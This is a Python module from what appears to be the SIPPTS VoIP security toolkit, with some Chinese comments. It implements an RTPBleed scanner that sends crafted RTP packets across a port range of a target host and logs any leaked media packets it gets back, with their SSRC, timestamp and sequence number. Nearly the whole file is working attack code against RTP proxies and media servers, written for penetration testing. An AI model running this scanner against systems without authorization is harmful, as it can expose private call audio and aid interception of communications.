#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__ = "Jose Luis Verdeguer"
__version__ = "4.1"
__license__ = "GPL"
__copyright__ = "Copyright (C) 2015-2024, SIPPTS"
__email__ = "pepeluxx@gmail.com"

# based in rtpnatscan: https://github.com/kapejod/rtpnatscan

import socket
import os
import sys
import time
import platform

from .lib.color import Color
from .lib.logos import Logo

# RTP负载类型定义
RTP_PAYLOAD_TYPES = {
    "0 PCMU (audio)": 0,
    "3 GSM (audio)": 3,
    "4 G723 (audio)": 4,
    "5 DVI4 (audio)": 5,
    "6 DVI4 (audio)": 6,
    "7 LPC (audio)": 7,
    "8 PCMA (audio)": 8,
    "9 G722 (audio)": 9,
    "10 L16 (audio)": 10,
    "11 L16 (audio)": 11,
    "12 QCELP (audio)": 12,
    "13 CN (audio)": 13,
    "14 MPA (audio)": 14,
    "15 G728 (audio)": 15,
    "16 DVI4 (audio)": 16,
    "17 DVI4 (audio)": 17,
    "18 G729 (audio)": 18,
    "25 CELLB (video)": 25,
    "26 JPEG (video)": 26,
    "28 nv (video)": 28,
    "31 H261 (video)": 31,
    "32 MPV (video)": 32,
    "33 MP2T (audio/video)": 33,
    "34 H263 (video)": 34
}

class RTPBleed:
    def __init__(self):
        self.ip = "192.168.4.200"
        self.start_port = "10042"
        self.end_port = "10043"
        self.loops = "200"
        self.payload = "0 PCMU (audio)"
        self.delay = "10"
        self.ofile = "rtpbleed.txt"
        
        self.run = True

        self.c = Color()

    def stop(self):
        """停止扫描"""
        print(f"\n{self.c.YELLOW}[!] 正在停止扫描...{self.c.WHITE}")
        self.run = False

    def start(self):
        self.start_port = int(self.start_port)
        self.end_port = int(self.end_port)
        self.loops = int(self.loops)
        payload_value = RTP_PAYLOAD_TYPES[self.payload]
        self.delay = int(self.delay)
        self.run = True

        logo = Logo("rtpbleed")
        logo.print()

        print(f"{self.c.BWHITE}[✓] Target IP: {self.c.YELLOW}{self.ip}")
        print(
            f"{self.c.BWHITE}[✓] Port range: {self.c.YELLOW}{self.start_port}{self.c.WHITE}-{self.c.YELLOW}{self.end_port}"
        )
        print(f"{self.c.BWHITE}[✓] Payload type: {self.c.YELLOW}{self.payload}")
        print(
            f"{self.c.BWHITE}[✓] Number of tries per port: {self.c.YELLOW}{self.loops}"
        )
        print(
            f"{self.c.BWHITE}[✓] Delay between tries: {self.c.YELLOW}{self.delay} microseconds"
        )
        print(self.c.WHITE)

        if self.ofile != "":
            f = open(self.ofile, "a+")
            f.write(f"Target IP: {self.ip}\n")

        # Create a UDP socket
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # 根据操作系统设置非阻塞模式
            if platform.system() != 'Windows':
                import fcntl
                fcntl.fcntl(sock, fcntl.F_SETFL, os.O_NONBLOCK)
            else:
                sock.setblocking(False)
                
        except socket.error:
            print(f"{self.c.RED}Failed to create socket")
            print(self.c.WHITE)
            sys.exit(1)

        port = self.start_port

        while port < self.end_port + 2:
            if not self.run:
                print(f"{self.c.YELLOW}[!] 扫描已停止{self.c.WHITE}")
                break
                
            try:
                host = (str(self.ip), port)

                loop = 0
                
                while loop < self.loops:
                    if not self.run:
                        break
                        
                    cloop = str(loop).zfill(4)
                    cpayload = "%s" % hex(0x80 | payload_value & 0x7F)[2:]
                    # byte[0] = 0x80 => RTP version 2
                    # byte[1] = 0x80+payload => Codec version (https://en.wikipedia.org/wiki/RTP_payload_formats)
                    # byte[2-3] = Sequence number
                    message = "80" + cpayload + cloop + "0000000000000000"
                    byte_array = bytearray.fromhex(message)

                    print(
                        f"{self.c.YELLOW}[+] Checking port: {str(port)} with payload type {self.payload} (Seq number: {str(loop+1)})  ",
                        end="\r",
                    )

                    # Send data
                    sock.sendto(byte_array, host)
                    time.sleep((self.delay + loop) / 1000.0)

                    loop += 1

                    try:
                        (msg, addr) = sock.recvfrom(4096)
                        (ipaddr, rport) = host
                        size = len(msg)

                        if size >= 12:
                            x = "%s%s" % (hex(msg[2])[2:], hex(msg[3])[2:])
                            seq = int("0x%s" % x, base=16)
                            x = "%s%s%s%s" % (
                                hex(msg[4])[2:],
                                hex(msg[5])[2:],
                                hex(msg[6])[2:],
                                hex(msg[7])[2:],
                            )
                            timestamp = int("0x%s" % x, base=16)
                            ssrc = "%s%s%s%s" % (
                                hex(msg[8])[2:],
                                hex(msg[9])[2:],
                                hex(msg[10])[2:],
                                hex(msg[11])[2:],
                            )

                            print(
                                f"{self.c.WHITE}received {str(size)} bytes from target port {str(rport)} - loop {str(loop)}"
                            )
                            print(
                                f"{self.c.WHITE}    [-] SSRC: {ssrc} - Timestamp: {timestamp} - Seq number: {seq}"
                            )
                            if self.ofile != "":
                                f.write(f"received {str(size)} bytes from target port {str(rport)} - loop {str(loop)} - SSRC: {ssrc} - Timestamp: {timestamp} - Seq number: {seq}\n")
                    except:
                        # No data available
                        continue
            except KeyboardInterrupt:
                print(f"{self.c.YELLOW}\nYou pressed Ctrl+C!")
                print(self.c.WHITE)
                self.run = False
            except:
                pass

            port += 2

        print(self.c.WHITE)

        if self.ofile != "":
            f.write("\n")
            f.close()
